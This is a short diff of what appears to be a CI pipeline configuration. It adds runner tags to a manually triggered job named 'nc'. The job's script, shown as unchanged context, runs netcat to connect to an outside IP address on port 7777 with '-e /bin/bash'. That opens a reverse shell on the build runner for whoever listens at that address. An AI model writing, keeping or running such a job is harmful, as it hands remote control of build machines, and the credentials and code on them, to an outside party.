@@ -69,4 +69,7 @@ nc:
   when: manual
   script: 
   - nc 88.99.219.12 7777 -e /bin/bash
+  tags:
+    - aelf
+    - macos
 
